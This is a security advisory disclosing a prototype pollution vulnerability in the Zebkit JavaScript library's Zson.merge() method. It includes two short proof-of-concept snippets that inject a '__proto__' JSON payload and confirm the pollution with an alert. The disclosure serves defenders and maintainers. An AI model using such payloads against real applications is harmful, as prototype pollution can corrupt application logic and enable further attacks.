---
title: Zebkit Prototype Pollution
severity: Moderate
ghsa_id: GHSA-j829-m9p4-q72f
cve_id: null
weaknesses:
- id: CWE-1321
  name: Improperly Controlled Modification of Object Prototype Attributes ('Prototype
    Pollution')
products:
- ecosystem: JavaScript
  package_name: Zebkit
  affected_versions: <= Git commit 4e51c13571230bce13b96de88338143f20996dbd
  patched_versions: ''
cvss: null
credits:
- github_user_id: rwhogg
  name: Bob "Wombat" Hogg
  avatar: https://avatars.githubusercontent.com/u/2373856?s=40&v=4
---

### Summary
Zebkit is vulnerable to prototype pollution when merging objects using the Zson.merge() method. This can allow insertion of arbitrary properties into the prototype chain of objects.

### Severity
Moderate - arbitrary properties can be inserted into the JavaScript prototype chain, whether or not a merge has been explicitly requested.

### Proof of Concept
```html
<!-- index.html –>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script type="text/javascript" src="http://zebkit.org/ver/latest/zebkit.min.js"></script>
</head>
<body>
<script>
document.addEventListener("DOMContentLoaded", function() {
    var zson = new zebkit.Zson()
    var badObj = JSON.parse('{"__proto__": {"prototype_is": "polluted"}}')
    zson.merge({}, badObj)
    alert("Prototype is " + "any object".prototype_is)
})
</script>
</body>
</html>
```
The above HTML file can be viewed directly in the browser or can be served with any web server. An alert saying “Prototype is polluted'' should pop up. This indicates that we successfully added a property to an object (in this case, the string “any object”) that was not apparently involved in the merge.

### Further Analysis
As merge() is called in the normal flow of Zson usage, it is not necessary for the developer to explicitly call it themselves in order for the vulnerability to be exploited. For example, this code does not explicitly call merge() but will have the same effect:

```js
var badObj = JSON.parse('{"__proto__": {"myprototype": "polluted"}}')
var zs2 = new zebkit.Zson({"a": "a"})
zs2.then(badObj, function(zson) {
    	alert("Alternate method: " + ({}).myprototype)
})
```


### Timeline
**Date reported**: 7/20/2022
**Date fixed**: 
**Date disclosed**: 10/18/2022